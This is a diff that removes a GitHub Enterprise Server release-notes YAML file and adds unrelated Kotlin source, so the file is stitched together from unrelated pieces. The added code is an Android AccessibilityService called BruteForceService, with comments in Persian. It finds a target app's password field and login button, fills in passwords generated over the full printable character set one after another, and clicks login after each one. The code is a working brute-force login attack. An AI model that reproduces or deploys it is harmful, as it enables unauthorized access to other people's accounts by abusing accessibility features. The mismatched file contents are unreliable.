@@ -1,24 +1,76 @@
-date: '2021-11-23'
-sections:
-  security_fixes:
-    - Packages have been updated to the latest security versions.
-  bugs:
-    - Running `ghe-repl-start` or `ghe-repl-status` would sometimes return errors connecting to the database when GitHub Actions was enabled.
-    - Pre-receive hooks would fail due to undefined `PATH`.
-    - 'Running `ghe-repl-setup` would return an error: `cannot create directory /data/user/elasticsearch: File exists` if the instance had previously been configured as a replica.'
-    - 'After setting up a high availability replica, `ghe-repl-status` included an error in the output: `unexpected unclosed action in command`.'
-    - In large cluster environments, the authentication backend could be unavailable on a subset of frontend nodes.
-    - Some critical services may not have been available on backend nodes in GHES Cluster.
-  changes:
-    - An additional outer layer of `gzip` compression when creating a cluster support bundle with `ghe-cluster-suport-bundle` is now turned off by default. This outer compression can optionally be applied with the `ghe-cluster-suport-bundle -c` command line option.
-    - We have added extra text to the admin console to remind users about the mobile apps' data collection for experience improvement purposes.
-    - The {% data variables.product.prodname_github_connect %} data connection record now includes a list of enabled {% data variables.product.prodname_github_connect %} features. [Updated 2021-12-09]
-  known_issues:
-    - The {% data variables.product.prodname_registry %} npm registry no longer returns a time value in metadata responses. This was done to allow for substantial performance improvements. We continue to have all the data necessary to return a time value as part of the metadata response and will resume returning this value in the future once we have solved the existing performance issues.
-    - On a freshly set up {% data variables.product.prodname_ghe_server %} without any users, an attacker could create the first admin user.
-    - Custom firewall rules are removed during the upgrade process.
-    - Git LFS tracked files [uploaded through the web interface](https://github.com/blog/2105-upload-files-to-your-repositories) are incorrectly added directly to the repository.
-    - Issues cannot be closed if they contain a permalink to a blob in the same repository, where the blob's file path is longer than 255 characters.
-    - When "Users can search GitHub.com" is enabled with GitHub Connect, issues in private and internal repositories are not included in GitHub.com search results.
-    - If {% data variables.product.prodname_actions %} is enabled for {% data variables.product.prodname_ghe_server %}, teardown of a replica node with `ghe-repl-teardown` will succeed, but may return `ERROR:Running migrations`.
-    - Resource limits that are specific to processing pre-receive hooks may cause some pre-receive hooks to fail.
+package com.example.bruteforce
+
+import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.AccessibilityServiceInfo
+import android.os.Handler
+import android.os.Looper
+import android.text.InputType
+import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
+
+class BruteForceService : AccessibilityService() {
+
+    private val handler = Handler(Looper.getMainLooper())
+    private var charset = buildCharset()
+    private var currentPassword = mutableListOf(0)
+
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        if (event == null || event.source == null) return
+
+        val root = rootInActiveWindow ?: return
+
+        // جایگزین با ID فیلد واقعی رمز عبور
+        val passwordFields = root.findAccessibilityNodeInfosByViewId("com.example.targetapp:id/password_field")
+        val loginButtons = root.findAccessibilityNodeInfosByViewId("com.example.targetapp:id/login_button")
+
+        if (passwordFields.isNotEmpty() && loginButtons.isNotEmpty()) {
+            val passwordField = passwordFields[0]
+            val loginButton = loginButtons[0]
+
+            val password = currentPassword.joinToString("") { charset[it].toString() }
+
+            passwordField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, android.os.Bundle().apply {
+                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, password)
+            })
+
+            handler.postDelayed({
+                loginButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                incrementPassword()
+            }, 1000)
+        }
+    }
+
+    override fun onInterrupt() {}
+
+    override fun onServiceConnected() {
+        serviceInfo = serviceInfo.apply {
+            eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or AccessibilityEvent.TYPE_VIEW_CLICKED
+            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
+            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
+            packageNames = null // می‌تونی محدودش کنی به اپ خاص
+        }
+    }
+
+    private fun buildCharset(): List<Char> {
+        val chars = mutableListOf<Char>()
+        chars.addAll('0'..'9')
+        chars.addAll('a'..'z')
+        chars.addAll('A'..'Z')
+        chars.addAll(listOf('!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '[', ']', '{', '}', ';', ':', '\'', '"', ',', '.', '<', '>', '/', '?', '\\', '|', '`', '~'))
+        return chars
+    }
+
+    private fun incrementPassword() {
+        var index = currentPassword.size - 1
+        while (index >= 0) {
+            if (currentPassword[index] < charset.lastIndex) {
+                currentPassword[index]++
+                return
+            } else {
+                currentPassword[index] = 0
+                index--
+            }
+        }
+        currentPassword.add(0)
+    }
+}
